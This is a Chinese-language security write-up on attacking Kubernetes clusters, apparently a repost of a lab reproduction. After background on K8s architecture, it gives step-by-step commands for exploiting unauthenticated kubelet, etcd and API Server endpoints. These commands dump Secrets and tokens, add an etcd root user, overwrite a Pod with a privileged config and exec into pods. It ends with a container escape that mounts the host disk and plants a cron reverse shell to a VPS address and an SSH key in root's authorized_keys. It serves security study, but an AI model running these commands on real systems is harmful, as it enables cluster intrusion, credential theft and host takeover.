# Kubernetes 集群未授权访问漏洞分析与容器逃逸横向移动
> 来源：https://xz.aliyun.com/news/92492

前面废话比较多，只是作为前置知识作为了解，有AI生成的内容，后续会通过自己搭建的K8S环境进行复现  
  

# 一、Kubernetes（K8s）介绍

  

## 简介

  
●Kubernetes（简称K8s）是Google开源的分布式容器编排平台，核心目标是解决大规模容器集群的“部署、调度、运维”三大核心难题  
  
●当Docker容器数量从几个增长到数百、数千个时，手工管理会面临效率低下、资源浪费、故障恢复困难等问题，K8s通过自动化能力将容器集群的管理标准化、规模化  
  
●可以延续“集装箱”类比：  
  
○Docker：将应用打包成“集装箱”（容器），保证环境一致性和可移植性  
  
○K8s：打造“智能港口+物流调度系统”，负责“集装箱”的跨节点分配、动态扩容、故障替换、路径规划（网络访问）等全生命周期管理  
  

## 核心架构

  
●K8s集群的“控制平面+节点”架构是实现分布式管理的基础，每个组件的职责与交互逻辑如下：  
  

| 层级 | 核心组件 | 解释 |
| --- | --- | --- |
| 控制平面 | API Server | 集群唯一入口（默认端口6443），所有操作（创建Pod、授权）均通过REST API执行，需经过“认证-授权-准入控制”三步流程 |
|  | etcd | 集群“数据库”，存储所有敏感信息（如Pod配置、ServiceAccount Token、集群状态），是集群的核心数据底座 |
|  | Scheduler | 调度策略包含“预选（Filter）+优选（Score）”：先筛选满足资源需求（CPU/内存）、标签匹配的节点，再按剩余资源、亲和性规则评分，选择最优节点 |
|  | Controller Manager | 包含多种控制器，例如Deployment控制器保证副本数，Node控制器监控节点状态，故障时触发Pod迁移 |
| 节点 | Kubelet | 节点“管家”，不仅执行容器创建/启停，还通过CNI插件配置网络、通过Cgroups限制资源，持续向API Server上报节点状态 |
|  | Kube-proxy | 维护节点的iptables/ipvs规则，实现Service的负载均衡（如ClusterIP的端口转发、NodePort的端口映射） |
|  | 容器运行时（CRI兼容） | 实际运行容器的组件（如：Docker、containerd、CRI-O），K8s通过CRI接口对接 |

  

## 核心资源

  
●K8s的资源对象是“声明式配置”的核心，每个资源对应特定的应用场景，关键资源的实操细节如下：  
  
○Pod：最小部署单元  
  
■本质：一组共享网络（同一IP）、存储（Volume）、PID命名空间的容器集合，容器间可通过localhost通信  
  
■ 实操关联：创建Pod需通过YAML文件定义（如nginx Pod的镜像、端口），执行`kubectl apply -f pod.yaml`提交，Kubelet接收指令后调用容器运行时拉取镜像创建容器  
■生命周期：从“Pending（调度中）”到“Running（运行中）”，故障时会被Controller Manager重建  
  
○Deployment：无状态应用核心控制器  
  
■ 核心能力：声明副本数（replicas）、滚动更新、版本回滚（`kubectl rollout undo`）；  
■ 示例：通过Deployment创建tomcat容器，可配置`securityContext: privileged: true`开启特权模式（但存在安全风险），并通过Volume挂载宿主机目录。  
○Service：稳定网络入口  
  
■解决问题：Pod动态漂移（IP变化）导致访问不稳定  
  
■类型：  
  
●ClusterIP：集群内部访问（默认）；  
  
● NodePort：暴露节点端口（如30080），外部可通过`节点IP:NodePort`访问；  
●LoadBalancer：对接云厂商负载均衡器（如阿里云SLB）  
  
■实操示例：通过YAML定义NodePort类型Service，可将Pod的8080端口映射到节点的30080端口，实现外部访问  
  
○ServiceAccount与Token  
  
■ 作用：Pod访问集群资源的身份凭证，Token存储在`/var/run/secrets/kubernetes.io/serviceaccount/token`；  
■ 权限关联：通过RBAC（基于角色的访问控制）绑定权限，如“hacker”ServiceAccount绑定`cluster-admin`角色后，拥有集群最高权限（文档中高权限Token的核心来源）  
○ConfigMap与Secret  
  
■ConfigMap：存储非敏感配置（如应用的数据库地址、端口），可通过环境变量或Volume挂载到Pod  
  
■Secret：存储敏感信息（如密码、证书），数据会base64编码（文档中提及的ServiceAccount Token就是Secret的一种）  
  
○Namespace：集群隔离工具  
  
■ 用途：按环境（开发/测试/生产）或团队划分资源，如`kube-system`（系统组件）、`default`（默认命名空间）  
■隔离范围：资源命名隔离（不同Namespace可存在同名Pod）、资源配额隔离（通过Resource Quota限制CPU/内存使用）  
  
○Ingress：七层路由  
  
■ 补充Service的不足：Service是四层（TCP/UDP）负载均衡，Ingress支持HTTP/HTTPS的域名路由（如`xxx.lazy.com`指向不同Service）、路径路由（如`/api`指向后端服务）  

## 核心工作流程（以创建一个Nginx Deployment并通过NodePort访问为例）

  

### 步骤1：用户提交部署请求（声明式API调用）

  
● 用户通过`kubectl apply -f nginx-deploy.yaml`提交配置文件，YAML文件定义Deployment（管理Pod副本）和Service（NodePort暴露服务），YAML示例如下  

```yaml
# Deployment：管理3个Nginx无状态副本
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deploy  # Deployment资源名称
  namespace: default  # 未指定时默认使用default命名空间
spec:
  replicas: 3  # 期望的Pod副本数
  selector:
    matchLabels:
      app: nginx-web  # 标签选择器：匹配带有该标签的Pod
  strategy:
    rollingUpdate:  # 默认滚动更新策略（可选，显式声明更规范）
      maxSurge: 25%  # 滚动更新时最多超出期望副本数25%
      maxUnavailable: 25%  # 滚动更新时最多不可用副本数25%
  template:
    metadata:
      labels:
        app: nginx-web  # Pod的标签，必须与selector.matchLabels一致
    spec:
      containers:
      - name: nginx-container  # 容器名称（唯一）
        image: nginx:1.21  # 容器镜像
        ports:
        - containerPort: 80  # 容器内监听的端口（仅声明，无网络暴露作用）
        resources:  # 可选，推荐声明资源限制
          requests:
            cpu: 100m
            memory: 128Mi
          limits:
            cpu: 200m
            memory: 256Mi
---
# Service：NodePort类型，为Pod提供稳定的网络访问入口
apiVersion: v1
kind: Service
metadata:
  name: nginx-svc  # Service资源名称
  namespace: default
spec:
  type: NodePort  # 服务类型：NodePort（集群外可通过节点IP+端口访问）
  selector:
    app: nginx-web  # 标签选择器：匹配后端Pod
  ports:
  - port: 80  # Service在集群内的访问端口（ClusterIP端口）
    targetPort: 80  # 转发到Pod/容器的端口（需与containerPort一致）
    nodePort: 30080  # 节点暴露的端口（可选，未指定时K8s自动分配30000-32767范围内的端口）
    protocol: TCP  # 协议类型（默认TCP，显式声明更规范）
```

  
● `kubectl`工具将 YAML 配置转换为REST API请求（POST/PUT），发送至K8s API Server（默认地址：https://:6443）  
●请求内容包含：要创建的资源类型（Deployment/Service）、命名空间、规格（副本数、镜像、Service 类型等）  
  

### 步骤2：API Server接收请求并执行“认证→授权→准入控制”三步校验

  
●API Server是集群唯一入口，所有请求必须通过三层校验，缺一不可  
  

#### 认证（Authentication）

  
●验证请求发起者的身份，常见认证方式：  
  
○ 若为kubectl命令行操作：默认使用`~/.kube/config`中的客户端证书（`client-certificate`）+私钥（`client-key`），或`ServiceAccount Token`  
○若为程序调用：通过Bearer Token、OIDC 令牌等方式认证  
  
● 认证失败：API Server直接返回`401 Unauthorized`，请求终止  
● 认证成功：进入下一步授权流程，同时记录请求者的身份（如`kubernetes-admin`）  

#### 授权（Authorization）

  
●基于RBAC（基于角色的访问控制）规则，检查认证通过的用户是否有“在 default 命名空间创建Deployment/Service”的权限：  
  
○ 核心校验逻辑：用户是否绑定了包含`apps/deployments/create`、`core/services/create`权限的Role/ClusterRole  
○ 例如：`cluster-admin`角色包含所有资源的所有操作权限，普通用户需显式授权  
● 授权失败：返回`403 Forbidden`，请求终止  
●授权成功：进入下一步准入控制流程  
  

#### 准入控制（Admission Control）

  
●对请求的资源配置进行“前置校验 / 修改”，分为两种类型：  
  
○验证型准入插件：校验配置合法性（如镜像是否在企业白名单、副本数是否超出命名空间配额、标签是否符合规范）；  
  
○突变型准入插件：自动修改配置（如：注入默认的资源限制、添加Sidecar容器、为Pod自动挂载ServiceAccount Volume）；  
  
● 常见核心插件：`NamespaceLifecycle`（校验命名空间是否存在）、`ResourceQuota`（校验资源配额）、`ValidatingAdmissionWebhook`（自定义校验规则）  
● 准入控制失败：返回`400 Bad Request`，请求终止  
● 准入控制成功：API Server将Deployment和Service的配置写入etcd（集群唯一数据存储），并返回`201 Created`  

### 步骤3：Controller Manager触发Pod创建逻辑

  
● etcd中存储的Deployment配置会被`kube-controller-manager`监听（内置Deployment控制器），执行以下操作：  
○Deployment控制器检测到“期望的Pod副本数（此处示例为3个）”与“当前集群中匹配标签的Pod数（0个）”不一致  
  
○ Deployment控制器自动创建`ReplicaSet`资源（名称格式：`nginx-deploy-<随机字符串>`），ReplicaSet的核心作用是保证指定数量的Pod副本始终运行  
○ReplicaSet控制器监听etcd中的ReplicaSet配置，检测到副本数不满足后，向 API Server提交“创建3个Pod”的请求  
  
○ API Server验证Pod配置后，将Pod对象写入etcd（此时Pod的`spec.nodeName`为空，处于“未调度”状态）  

### 步骤 4：Scheduler完成Pod调度（分配目标节点）

  
● `kube-scheduler`（调度器）通过`Informer`机制监听etcd中“未调度 Pod”（`spec.nodeName`为空），执行“预选 + 优选”两步调度：  

#### 预选（Filter）：筛选符合条件的节点

  
●排除不符合硬规则的节点，例如：  
  
○节点是否存活（Ready状态）；  
  
○ 节点剩余CPU / 内存是否满足Pod的`resources.requests`；  
○ 节点是否有Pod亲和性 / 反亲和性冲突（如：Pod要求必须部署在`node-1`）；  
○节点是否有污点（Taint）且 Pod 无对应的容忍（Toleration）；  
  
● 若所有节点都不符合，Pod会一直处于`Pending`状态，调度器记录事件：`FailedScheduling`  

#### 优选（Score）：对预选通过的节点打分

  
●对符合条件的节点按“优选策略”打分（0-100分），例如：  
  
○ `LeastRequestedPriority`：剩余资源越多的节点得分越高（优先调度到资源空闲的节点）  
○ `NodeAffinityPriority`：匹配 Pod 节点亲和性规则的节点加分  
○ `BalancedResourceAllocation`：CPU / 内存使用率越均衡的节点得分越高  
●选择得分最高的节点（若配置“反亲和性”，3 个Pod会被调度到不同节点）  
  

#### 确认调度结果

  
● 调度器将Pod的`spec.nodeName`字段更新为目标节点名称（如：`node-1、node-2、node-3`），并写入`etcd`  
● API Server将调度结果同步给目标节点的`kubelet`组件  

### 步骤5：目标节点的Kubelet创建Pod和容器

  
● 每个节点的`kubelet`会定期向API Server发起请求，监听“分配给当前节点的Pod”，接收到Pod调度指令后，执行以下操作：  
○预处理阶段：  
  
■校验节点本地资源（CPU / 内存）是否满足Pod需求  
  
■挂载Pod所需的 Volume（如 ConfigMap、Secret、EmptyDir）  
  
■ 通过CNI（容器网络接口）插件（如 Calico/Flannel）为 Pod 创建网络命名空间，分配Pod IP（如`10.244.2.5`），配置跨节点通信规则  
○容器创建阶段：  
  
■ Kubelet通过CRI（容器运行时接口）调用containerd，执行镜像拉取：`containerd pull nginx:1.21`  
■拉取完成后，containerd 创建容器运行时沙箱（Sandbox，通常是pause容器），Pod内所有容器共享沙箱的网络 / IPC命名空间  
  
■创建nginx容器，配置容器的端口、资源限制、环境变量等  
  
○状态上报阶段：  
  
■ Kubelet启动容器后，将Pod状态更新为`Running`，并通过API Server同步到etcd；  
■ Kubelet 持续监控容器状态（通过容器运行时的监控接口），若容器崩溃，按Pod的`restartPolicy`（默认Always）重启容器  

### 步骤6：Kube-proxy配置Service网络规则，实现服务暴露

  
● `kube-proxy`运行在每个节点上，监听etcd中的Service配置（nginx-svc），根据 Service类型（NodePort）配置网络转发规则（默认iptables模式，也可配置ipvs模式）：  
○ 为Service分配ClusterIP：API Server为nginx-svc分配集群内唯一的虚拟 IP（如`10.96.0.10`）；  
○配置 iptables 规则：  
  
■ 在节点上创建`KUBE-SVC-<哈希值>`链：将访问`ClusterIP:80`的流量转发到后端3个Pod的`IP:80`；  
■ 创建`KUBE-NODEPORTS`链：将访问节点`IP:30080`的流量转发到`ClusterIP:80`；  
■配置负载均衡规则：iptables通过随机 / 轮询方式将流量分发到不同Pod  
  
○端点同步：  
  
■ `kube-proxy`通过EndpointSlice（替代传统Endpoint）监听 Pod 的存活状态，若某个Pod故障（如：livenessProbe失败），自动将其从 iptables 转发规则中移除  

### 步骤7：外部访问Nginx服务

  
● 客户端可通过任意节点的`IP:30080`访问Nginx服务：  
○ 例如：节点IP为`192.168.1.100`，访问`http://192.168.1.100:30080`  
○ 流量路径：客户端→`节点 IP:30080`→iptables规则转发→`ClusterIP:80`→后端`Pod IP:80`→nginx容器  

## K8s与Docker的核心区别

  

| 维度 | Docker | K8s |
| --- | --- | --- |
| 技术定位 | 容器化引擎（打包+单机运行）+ 简单编排（Docker Compose） | 分布式容器编排平台（跨节点集群管理） |
| 核心解决问题 | 解决“环境一致性”“单机容器运行”问题 | 解决“大规模容器调度”“集群高可用”“跨节点网络”等分布式问题 |
| 权限与安全 | 单机容器权限控制（如--privileged开启特权模式），无集群级授权机制 | 集群级权限控制（RBAC）、ServiceAccount Token认证、准入控制（镜像白名单） |
| 网络能力 | 单机容器网络（Bridge/Host模式），跨主机通信需手动配置 | CNI插件实现跨节点Pod通信，Service提供稳定入口，Ingress支持七层路由 |
| 存储管理 | 单机Volume（依赖宿主机路径），无动态供给能力 | PV/PVC解耦存储供应与使用，支持分布式存储对接，动态分配存储资源 |
| 扩缩容 | 需手动修改Docker Compose文件，重启容器，无自动扩缩容 | 支持手动扩缩容（kubectl scale）和自动扩缩容（HPA），秒级响应 |
| 故障恢复 | 容器崩溃需手动重启，无节点故障转移能力 | Pod自愈、节点故障时Pod自动迁移，集群级高可用保障 |
| 实操场景 | 本地开发、单机测试（如文档中docker run启动nginx容器） | 生产环境、大规模部署（如文档中多节点集群部署tomcat、通过Token管理权限） |

  

# 二、Kubernetes Kubelet未授权访问

  

## 漏洞简介

  
●Kubelet未授权访问漏洞是因Kubelet组件认证/授权配置不当，导致未认证主体可访问其API端口（核心端口为：10250、10255），进而窃取集群信息、执行容器命令甚至控制节点的高危配置缺陷  
  
●Kubelet在K8S节点上负责Pod / 容器生命周期管理、状态上报与指令执行，对外提供10250（HTTPS可写API，默认需认证）与10255（HTTP只读 API，默认关闭）两个核心端口  
  
● 漏洞核心成因：由于`/var/lib/kubelet/config.yaml`文件配置不当，开启了匿名访问（`anonymous.enabled: true`）且授权策略设为`AlwaysAllow`，而默认情况下kubelet监听的10250端口没有进行任何认证鉴权，就会导致未授权主体绕过认证/授权直接调用API  
○ 靶机改完配置文件后要执行`systemctl daemon-reload和systemctl restart kubelet`重启一下服务  

```yaml
apiVersion: kubelet.config.k8s.io/v1beta1
authentication:
  anonymous:
    enabled: true  # 关键修改：从 false 改为 true，允许匿名访问（解决认证阶段拒绝问题）
  webhook:
    cacheTTL: 0s
    enabled: false # 关键修改：从 true 改为 false，关闭 webhook 认证
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt
authorization:
  mode: AlwaysAllow  # 关键修改：从 Webhook 改为 AlwaysAllow，允许所有授权请求
  webhook:
    cacheAuthorizedTTL: 0s
    cacheUnauthorizedTTL: 0s
cgroupDriver: systemd
clusterDNS:
- 10.96.0.10
clusterDomain: cluster.local
cpuManagerReconcilePeriod: 0s
evictionPressureTransitionPeriod: 0s
fileCheckFrequency: 0s
healthzBindAddress: 127.0.0.1
healthzPort: 10248
httpCheckFrequency: 0s
imageMinimumGCAge: 0s
kind: KubeletConfiguration
logging: {}
nodeStatusReportFrequency: 0s
nodeStatusUpdateFrequency: 0s
resolvConf: /run/systemd/resolve/resolv.conf
rotateCertificates: true
runtimeRequestTimeout: 0s
staticPodPath: /etc/kubernetes/manifests
streamingConnectionIdleTimeout: 0s
syncFrequency: 0s
volumeStatsAggPeriod: 0s
```

## 漏洞利用

  
●访问kubelet的10250服务，发现存在未授权  
  

```yaml
https://ip:10250/pods
...
```

![](https://imglink.cc/cdn/c9GvQ24iL7.png)

  
  
●使用kubeletctl工具进行漏洞利用  
  
○ 下载地址：[https://github.com/cyberark/kubeletctl/releases/](https://github.com/cyberark/kubeletctl/releases/)  
○列出kubelet的所有Pod  
  

```yaml
kubeletctl.exe pods -i --server 10.10.10.144
```

![](https://i.im.ge/QMVBu21/p2m-ed8b5582cb.png)

  
  

```
- 搜索容器里的Service Account
```

```yaml
kubeletctl.exe scan token -i --server 10.10.10.144
```

![](https://i.im.ge/QMVBFwf/p2m-2ba2d3c142.png)

  
  

```
- 执行命令
```

```yaml
kubeletctl.exe exec hostname -c kube-apiserver -p kube-apiserver-k8s-master -n kube-system --server 10.10.10.144
kubeletctl.exe exec "/usr/local/bin/kube-apiserver --version" -c kube-apiserver -p kube-apiserver-k8s-master -n kube-system --server 10.10.10.144
```

![](https://i.im.ge/QMVBXAp/p2m-1edca5cebd.png)

  
  

# 三、ETCD端口未授权访问

  

## 漏洞简介

  
●在安装完K8S后，默认会安装etcd组件，etcd是一个高可用的key-value数据库，它为K8S集群提供底层数据存储，保存了整个集群的状态  
  
●Kubernetes集群的etcd服务端口  
  
○默认2379（TCP）用于客户端API端口（对外提供数据读写）  
  
○默认2380（TCP）集群间对等通信端口（节点同步数据）  
  
●etcd存储了Kubernetes集群的很多关键数据  
  
○所有Secrets  
  
■数据库密码、API 令牌、OAuth凭据、TLS证书私钥、Docker仓库密码等  
  
■攻击者可以直接提取这些secret，用于横向移动、入侵后端服务或窃取数据  
  
○所有ConfigMaps： 应用的配置文件，可能包含敏感信息  
  
○所有集群状态：  
  
■Pod、Service、Deployment的定义  
  
■通过篡改这些数据，攻击者可以删除、创建或修改任何资源，例如：将一个正常Pod的镜像替换为恶意镜像，或者在集群中部署一个拥有特权、挂载主机路径的恶意Pod，从而完全控制宿主机节点  
  
○ServiceAccount令牌： 与Kubernetes API交互的凭据，拥有特定RBAC权限  
  
○网络策略、RBAC 规则： 攻击者可以修改或删除这些安全策略，为后续渗透铺平道路  
  
○...  
  
● 如果目标在启动etcd的时候`/etc/kubernetes/manifests/etcd.yaml`文件配置不当，没有开启证书认证选项，且2379端口直接对外开放的话，就会导致存在etcd未授权访问漏洞，比如以下配置  

```yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubeadm.kubernetes.io/etcd.advertise-client-urls: https://10.10.10.144:2379  # 保留HTTPS供kube-apiserver使用
  creationTimestamp: null
  labels:
    component: etcd
    tier: control-plane
  name: etcd
  namespace: kube-system
spec:
  containers:
  - command:
    - etcd
    - --advertise-client-urls=https://10.10.10.144:2379
    - --cert-file=/etc/kubernetes/pki/etcd/server.crt
    - --key-file=/etc/kubernetes/pki/etcd/server.key
    - --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt
    # 关闭客户端证书认证（关键：允许无证书访问）
    - --client-cert-auth=false
    - --data-dir=/var/lib/etcd
    - --initial-advertise-peer-urls=https://10.10.10.144:2380
    - --initial-cluster=k8s-master=https://10.10.10.144:2380
    - --peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt
    - --peer-client-cert-auth=true
    - --peer-key-file=/etc/kubernetes/pki/etcd/peer.key
    - --peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt
    # 同时监听HTTPS（2379）和HTTP（2382），2382端口开放未授权访问
    - --listen-client-urls=https://127.0.0.1:2379,https://10.10.10.144:2379,http://0.0.0.0:2382
    - --listen-metrics-urls=http://127.0.0.1:2381
    - --listen-peer-urls=https://10.10.10.144:2380
    - --name=k8s-master
    - --snapshot-count=10000
    image: registry.aliyuncs.com/google_containers/etcd:3.4.13-0
    imagePullPolicy: IfNotPresent
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /health
        port: 2381
        scheme: HTTP
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    name: etcd
    resources: {}
    startupProbe:
      failureThreshold: 24
      httpGet:
        host: 127.0.0.1
        path: /health
        port: 2381
        scheme: HTTP
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    volumeMounts:
    - mountPath: /var/lib/etcd
      name: etcd-data
    - mountPath: /etc/kubernetes/pki/etcd
      name: etcd-certs
  hostNetwork: true
  priorityClassName: system-node-critical
  volumes:
  - hostPath:
      path: /etc/kubernetes/pki/etcd
      type: DirectoryOrCreate
    name: etcd-certs
  - hostPath:
      path: /var/lib/etcd
      type: DirectoryOrCreate
    name: etcd-data
status: {}
```

## 漏洞利用（v3举例）

  
● 工具下载：[https://github.com/etcd-io/etcd/releases](https://github.com/etcd-io/etcd/releases)  
●判断2382端口是否存在未授权访问  
  

```yaml
http://ip:2382/version
```

![](https://i.im.ge/QMVBlpP/p2m-d91eb550e9.png)

  
  
●查看节点状态  
  

```yaml
etcdctl.exe --endpoints=http://10.10.10.144:2382 endpoint status
```

![](https://i.im.ge/QMVBdc0/p2m-2d73aa9b81.png)

  
  
●获取键值  
  
○这里的重点是读取Secret键的Token，可能可以获取高权限的Token，配合第六节的知识点进行K8S接管  
  

```yaml
// 完整读取ETCD中所有键的名称 + 对应数值
etcdctl.exe --endpoints=http://10.10.10.144:2382 get / --prefix

// 数据过多，可以导出到文件
etcdctl.exe --endpoints=http://10.10.10.144:2382 get / --prefix > 1.txt

// 只输出键的名称，不输出键对应的数值：ETCD 中每个键都有“键名:数值”的结构，比如：/registry/secrets/kube-system/token对应一串加密的Token），加这个参数会简化输出，只显示键名，方便快速查看ETCD存储的所有数据结构，避免数值内容过多干扰判断
etcdctl.exe --endpoints=http://10.10.10.144:2382 get / --prefix --keys-only

// 查找所有Secret的键名
etcdctl.exe --endpoints=http://10.10.10.144:2382 get /registry/secrets/ --prefix --keys-only

// 查看所有Secret的键名 + 完整数据
etcdctl.exe --endpoints=http://10.10.10.144:2382 get /registry/secrets/ --prefix

// 读取指定键名的完整数据
etcdctl.exe --endpoints=http://10.10.10.144:2382 get /registry/secrets/default/default-token-qchs9

// 读取Pod数据
etcdctl.exe --endpoints=http://10.10.10.144:2382 get /registry/pods/ --prefix --keys-only
```

![](https://i.im.ge/QMVBqeT/p2m-9ee84e7daf.png)

  
  
●添加用户  
  

```yaml
// 添加一个名为Lazy的用户，根据提示设置密码（输入两次）
etcdctl.exe --endpoints=http://10.10.10.144:2382 user add Lazy
```

![](https://i.im.ge/QMVBSiW/p2m-49f56d6460.png)

  
  
●查看用户  
  

```yaml
// 返回空，证明没有用户
etcdctl.exe --endpoints=http://10.10.10.144:2382 user list
```

![](https://i.im.ge/QMVBOKm/p2m-75d2100b55.png)

  
  
●赋予用户权限  
  

```yaml
// 赋予Lazy这个用户root权限
etcdctl.exe --endpoints=http://10.10.10.144:2382 user grant-role Lazy root
```

![](https://i.im.ge/QMVB2lr/p2m-5deaf4a914.png)

  
  
●查看用户权限  
  

```yaml
// ，查看Lazy用户的权限，Roles字段显示空则表示无权限
etcdctl.exe --endpoints=http://10.10.10.144:2382 user get Lazy
```

![](https://i.im.ge/QMVBa7c/p2m-fdf24b8d29.png)

  
  
●删除用户  
  

```yaml
// 删除Lazy用户
etcdctl.exe --endpoints=http://10.10.10.144:2382 user delete Lazy
```

![](https://i.im.ge/QMVB7CL/p2m-231697b72c.png)

  
  
●将恶意配置写入ETCD，覆盖原始Pod数据  
  
○通过get可以获取Pod的详细信息（Windows下执行会乱码）  
  

```yaml
etcdctl.exe --endpoints=http://10.10.10.144:2382 --write-out=json get /registry/pods/default/escape-pod > malicious-pod.txt
```

![](https://i.im.ge/QMVBU6a/p2m-01e7dacd90.png)

  
  
```
-  构造恶意Pod配置：将目标Pod修改完以后（比如：添加`privileged: true`，使得后续能够通过特权模式进行容器逃逸）将信息保存到`malicious-pod.txt`中
-  将恶意配置写入ETCD（覆盖原始Pod数据）  
```  

```yaml
// 读取恶意配置文件内容，写入ETCD（覆盖原Pod）
$maliciousConfig = Get-Content -Path "malicious-pod.txt" -Raw

etcdctl.exe --endpoints=http://10.10.10.144:2382 put /registry/pods/default/nginx-pod $maliciousConfig
```

●此时可以进入这个恶意Pod，然后逃逸到宿主机  
  

# 四、K8s API Server未授权

  

## 漏洞简介

  
●API Server是整个K8S集群的核心入口，所有组件（如：kubelet、kube-controller-manager）和用户的操作请求（如：创建Pod、查询资源）都必须通过它处理  
  

![](https://i.im.ge/QMVBDpG/p2m-6b0bfe8b64.png)

  
  
●未授权访问的本质是认证环节失效或授权环节完全放行，导致攻击者无需提供合法身份凭证（如：token、证书），即可绕过权限检查操作集群资源：  
  
○ 认证（Authentication）：验证请求者是谁，若`/etc/kubernetes/manifests/kube-apiserver.yaml`中配置开启`anonymous-auth=true`，则允许匿名用户发送请求（无需任何凭证）  
○ 授权（Authorization）：验证请求者能做什么，若若`/etc/kubernetes/manifests/kube-apiserver.yaml`中配置授权模式为`AlwaysAllow`（默认为`Node,RBAC`），则无论认证结果如何，所有请求都会被直接放行  

![](https://i.im.ge/QMVBL2x/p2m-12807e43c6.png)

  
  
●API Server默认会开启两个端口（低版本）：Insecure Port和Secure Port  
  
○Insecure Port  
  
■ 标识为`--insecure-port`，值默认为0，表示此端口默认关闭，如果需要开启HTTP非安全端口模式，可以把`--insecure-port`的值设置为8080  
■ 默认IP是本地主机，标识为`--insecure-bind-address`  
■在HTTP中没有认证和授权检查  
  

![](https://i.im.ge/QMVB9cz/p2m-717399bb16.png)

  
  

```
- Secure Port
    * 标识为`--secure-port`，默认端口为6443
    * 认证方式：令牌/客户端证书
```

![](https://i.im.ge/QMVB50S/p2m-9fb73ecc43.png)

  
  
● 在低版本的K8S中，如果`/etc/kubernetes/manifests/kube-apiserver.yaml`有如下配置，则可能存在未授权访问漏洞  
○ `--anonymous-auth=true`：允许任何没有提供身份凭证的请求以匿名用户身份发送到API Server，跳过身份验证的环节  
○ `--authorization-mode=AlwaysAllow`：无论请求者是谁（包括匿名用户）、请求操作是什么，API Server都会直接放行，完全绕过授权检查环节  
○ `--insecure-port=8080`：K8S API Server默认的6443安全端口（HTTPS协议）要求所有请求必须经过TLS加密，且强制验证客户端的身份凭证，而非安全端口使用明文HTTP协议，且默认不强制要求客户端提供任何身份凭证，此处设置相当于主动启用了这个“无加密、无强制认证”的端口，导致可以绕过API Server最基础的TLS加密和凭证校验机制，无需处理HTTPS证书验证，也无需准备合法的身份凭证，只需直接向8080端口发送明文HTTP请求，就能与API Server建立通信  
○ `--insecure-bind-address=0.0.0.0`：这个参数决定了8080端口的网络监听范围，如果该参数设为127.0.0.1，那么8080端口只能被API Server所在节点的本地进程访问，外部主机（包括集群内其他节点、外网主机）无法连接到该端口，但设为0.0.0.0后，8080端口会对外暴露到该节点的所有网络（如内网、公网），任何能访问该节点 IP的攻击者都能直接连接到8080端口  

```yaml
开启匿名访问：--anonymous-auth=true
关闭授权校验：--authorization-mode=AlwaysAllow
暴露不安全端口：--insecure-port=8080、--insecure-bind-address=0.0.0.0
```

![](https://i.im.ge/QMVBje6/p2m-0432355530.png)

  
  

## 漏洞验证

  
●直接访问8080端口，可以未授权访问API接口信息  
  

![](https://i.im.ge/QMVBhKJ/p2m-5b7cd79122.png)

  
  
● 可以获取`service-account-token`  

```cpp
http://10.10.10.184:8080/api/v1/namespaces/kube-system/secrets/
```

![](https://i.im.ge/QMVB0ly/p2m-dfe2160c2d.png)

  
  
●还可以执行包括但不仅限于以下操作  
  
○ 工具下载：[https://cdn.dl.k8s.io/release/v1.35.0/bin/windows/amd64/kubectl.exe](https://cdn.dl.k8s.io/release/v1.35.0/bin/windows/amd64/kubectl.exe)  
○查询默认命名空间下所有Pod  
  

```cpp
kubectl.exe -s 10.10.10.184:8080 get pods
```

![](https://imglink.cc/cdn/m1KtuS5zgq.png)

  
  

```
- 查询集群所有节点
```

```cpp
kubectl.exe -s 10.10.10.184:8080 get nodes
```

![](https://imglink.cc/cdn/ZRdXuAu9qG.png)

  
  

```
- 查询所有命名空间下的Pod
```

```cpp
kubectl.exe -s 10.10.10.184:8080/ get pods --all-namespaces=true
```

![](https://i.im.ge/QMVBwDF/p2m-bfc4dabd48.png)

  
  

```
- 进入`default`命名空间的`<font style="color:rgb(18, 18, 18);">escape-pod</font>`这个Pod执行bash命令
```

```cpp
kubectl.exe -s 10.10.10.184:8080 --namespace=default exec -it escape-pod -- bash
```

![](https://imglink.cc/cdn/8UjckbbooS.png)

  
  

# 五、容器逃逸（挂载根文件系统）

  

## 核心原理

  
● 当容器以特权模式（`privileged: true`）启动时，容器内root用户会获得宿主机root权限，在开启特权模式的容器内可以通过挂载（mount）宿主机的根文件系统实现容器逃逸  
● Kubernetes中通过`securityContext.privileged: true`配置开启此模式，如下所示  

![](https://i.im.ge/QMVB6CK/p2m-b453bb9427.png)

  
  

## 逃逸方式

  
● 判断当前是否为特权模式，如果是特权模式启动的话CapEff对应的掩码值应该为`0000003fffffffff`或者是`0000001fffffffff`  

```cpp
cat /proc/self/status | grep CapEff
```

![](https://imglink.cc/cdn/iq341tVaZd.png)

  
  

![](https://imglink.cc/cdn/7WK7EWTsmC.png)

  
  
●查看磁盘分区，查看可以挂载的分区  
  

```cpp
lsblk
```

![](https://imglink.cc/cdn/8uOi1QQSJN.png)

  
  
●创建目录，并将分区挂载到目录中  
  

```cpp
// 创建挂载点目录
mkdir -p /mnt/host_root

// 挂载宿主机根分区（sda5）
mount /dev/sda5 /mnt/host_root
```

![](https://i.im.ge/QMVBNv9/p2m-afae86a2a3.png)

  
  
●验证是否挂载成功  
  

```cpp
// 进入挂载的目录
cd /mnt/host_root/
ls
chroot /mnt/host_root /bin/bash     // chroot切换根环境，方便进行计划任务反弹shell
```

![](https://i.im.ge/QMVBtSX/p2m-787949072d.png)

  
  
●计划任务反弹shell获取宿主机权限  
  

```cpp
// 创建计划任务
crontab -e
*/1 * * * *  /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.2.96/8080 0>&1"

// VPS监听反弹shell
nc -lvvp 8080
```

●写入ssh公钥获取宿主机权限  
  

```cpp
// 在VPS中生成公私钥文件
ssh-keygen -t rsa -b 4096 -f my_key -N ""

// 此时已经挂载了宿主机的目录，可以直接将公钥写入宿主机的/root/.ssh/authorized_keys文件中，并赋予对应权限
echo "公钥内容" >> /mnt/host_root/root/.ssh/authorized_keyschmod 600 /test11/root/.ssh/authorized_keys

// 修改宿主机的/etc/ssh/sshd_config文件，设置参数允许可被ssh远程连接
PubkeyAuthentication yes
PermitRootLogin yes
